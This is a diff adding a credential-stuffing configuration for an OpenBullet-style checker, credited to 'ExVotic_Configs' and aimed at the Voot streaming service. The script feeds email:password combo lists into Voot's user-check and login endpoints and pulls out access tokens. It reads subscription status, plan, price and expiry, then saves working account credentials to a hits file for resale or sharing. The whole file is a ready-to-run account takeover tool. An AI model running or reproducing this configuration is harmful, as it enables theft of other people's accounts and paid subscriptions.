@@ -1,0 +1,188 @@
+[SETTINGS]
+{
+  "Name": "Voot @ExVotic_Configs",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-08-04T00:35:00.5441495+05:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "ExVotic_Configs",
+  "Version": "1.1.1 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "VOOT",
+  "IconPath": "Icon\\svbfile.ico",
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#User-Agent FUNCTION GetRandomUA -> VAR "UA" 
+
+#Mail_validation REQUEST POST "https://userauth.voot.com/usersV3/v3/checkUser" 
+  CONTENT "{\"type\":\"email\",\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "origin: https://www.voot.com" 
+  HEADER "referer: https://www.voot.com/" 
+  HEADER "sec-ch-ua: \".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"" 
+  HEADER "sec-ch-ua-mobile: ?1" 
+  HEADER "sec-ch-ua-platform: \"Android\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: <UA>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "This email is not registered with us" 
+    KEY "Email must be a valid email" 
+    KEY "<RESPONSECODE>" Contains "400" 
+  KEYCHAIN Success OR 
+    KEY "This Email is already registered with us" 
+    KEY "<RESPONSECODE>" Contains "200" 
+
+#UID FUNCTION GenerateGUID -> VAR "uid" 
+
+#Account_Validation REQUEST POST "https://userauth.voot.com/usersV3/v3/login" 
+  CONTENT "{\"type\":\"traditional\",\"deviceId\":\"<uid>\",\"deviceBrand\":\"PC/MAC\",\"data\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "origin: https://www.voot.com" 
+  HEADER "referer: https://www.voot.com/" 
+  HEADER "sec-ch-ua: \".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"" 
+  HEADER "sec-ch-ua-mobile: ?1" 
+  HEADER "sec-ch-ua-platform: \"Android\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: <UA>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+    KEY "That’s an incorrect password." 
+  KEYCHAIN Ban OR 
+    KEY "Your account is blocked" 
+  KEYCHAIN Success OR 
+    KEY "200" 
+    KEY "accessToken" 
+
+#Token PARSE "<SOURCE>" JSON "accessToken" -> VAR "tk" 
+
+#Status REQUEST GET "https://pxapi.voot.com/smsv4/int/ps/v1/voot/user/entitlement/status" 
+  
+  HEADER "accesstoken: <tk>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: pxapi.voot.com" 
+  HEADER "Origin: https://www.voot.com" 
+  HEADER "Referer: https://www.voot.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"" 
+  HEADER "sec-ch-ua-mobile: ?1" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: <UA>" 
+
+#Combo UTILITY File "Combo\\Combos.txt" AppendLines "<USER>:<PASS>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "status\":\"active" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"freeTrial\":true," 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "status\":\"expired\"" 
+
+#Expiry1 PARSE "<SOURCE>" JSON "gmtDate" -> VAR "Expiry" 
+
+#Expiry2 FUNCTION Remove "0" "5" "<Expiry>" -> VAR "exp" 
+
+#Expiry3 FUNCTION Replace " " "-" "<exp>" -> VAR "exp1" 
+
+#Expiry4 FUNCTION Translate 
+  KEY "Jan" VALUE "01" 
+  KEY "Feb" VALUE "02" 
+  KEY "Mar" VALUE "03" 
+  KEY "Apr" VALUE "04" 
+  KEY "May" VALUE "05" 
+  KEY "Jun" VALUE "06" 
+  KEY "Jul" VALUE "07" 
+  KEY "Aug" VALUE "08" 
+  KEY "Sep" VALUE "09" 
+  KEY "Oct" VALUE "10" 
+  KEY "Nov" VALUE "11" 
+  KEY "Dec" VALUE "12" 
+  "<exp1>" -> VAR "exp2" 
+
+#Expiry5 FUNCTION Remove "11" "13" "<exp1>" -> CAP "Expires on" 
+
+#Expiry FUNCTION GetRemainingDay "<Expires on>" -> CAP "Remaining Days" 
+
+#Transaction_list REQUEST GET "https://pxapi.voot.com/smsv4/int/ps/v1/voot/transaction/list" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "accesstoken: <tk>" 
+  HEADER "origin: https://www.voot.com" 
+  HEADER "referer: https://www.voot.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: <UA>" 
+
+#Renewal PARSE "<SOURCE>" JSON "isRenewable" CreateEmpty=FALSE -> CAP "Renewal" 
+
+#Plan_Type PARSE "<SOURCE>" LR "\",\"name\":\"" "\"," CreateEmpty=FALSE -> CAP "Plan" 
+
+#Plan_Price PARSE "<SOURCE>" LR "\"price\":{\"amount\":" ",\"" CreateEmpty=FALSE -> CAP "Plan Price" 
+
+#Credits FUNCTION Constant "@ExVotic_Configs" -> CAP "Config By" 
+
+UTILITY File "Hits\\Voot_Hits.txt" AppendLines "\\n[+]----------- Voot Account ----------[+]\\n \\nEmail = <USER>\\nPassword = <PASS>\\n \\n[+] Expiry = <Expires on>\\n[+] Days Left = <Remaining Days>\\n[+] Plan = <Plan>\\n[+] Price = <Plan Price>\\n[+] Renewal = <Renewal>\\n[+] Config By = @ExVotic | Join @ExVotic_Network\\n\\n[+]-----------------------------------[+]\\n " 
+
